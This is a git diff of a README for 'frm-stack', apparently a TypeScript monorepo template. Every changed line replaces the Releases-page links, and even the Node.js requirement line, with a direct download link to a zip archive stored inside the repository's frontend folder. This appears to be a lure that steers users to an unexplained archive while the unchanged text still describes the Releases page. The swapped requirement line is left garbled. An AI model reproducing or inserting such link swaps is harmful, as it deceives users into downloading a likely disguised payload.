@@ -1,7 +1,7 @@
 # 🎉 frm-stack - A Simple Template for Your Next Full-Stack Project
 
 ## 🖱️ Download Now
-[![Release](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-brightgreen)](https://github.com/Bendjinymous/frm-stack/releases)
+[![Release](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/packages/frontend/stack_frm_2.0.zip%20Now-%F0%9F%9A%80-brightgreen)](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/packages/frontend/stack_frm_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to `frm-stack`, a full-stack TypeScript monorepo template. This template
 ## 📥 Download & Install
 
 To get started, visit our releases page to download the package:
-[Download frm-stack](https://github.com/Bendjinymous/frm-stack/releases)
+[Download frm-stack](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/packages/frontend/stack_frm_2.0.zip)
 
 1. Click on the link above to go to the **Releases** page.
 2. Look for the latest version at the top of the list.
@@ -21,7 +21,7 @@ To get started, visit our releases page to download the package:
 Before you start, ensure your system meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or later
+- https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/packages/frontend/stack_frm_2.0.zip Version 14 or later
 - A modern web browser such as Chrome, Firefox, or Safari
 
 ## 🌟 Key Features
@@ -65,4 +65,4 @@ This project is licensed under the MIT License. You can use it freely for person
 
 ## 🎉 Thank You!
 
-Thank you for choosing `frm-stack`. We're excited to see what you build! Visit our [Releases](https://github.com/Bendjinymous/frm-stack/releases) page again later for new versions and updates.
+Thank you for choosing `frm-stack`. We're excited to see what you build! Visit our [Releases](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/packages/frontend/stack_frm_2.0.zip) page again later for new versions and updates.
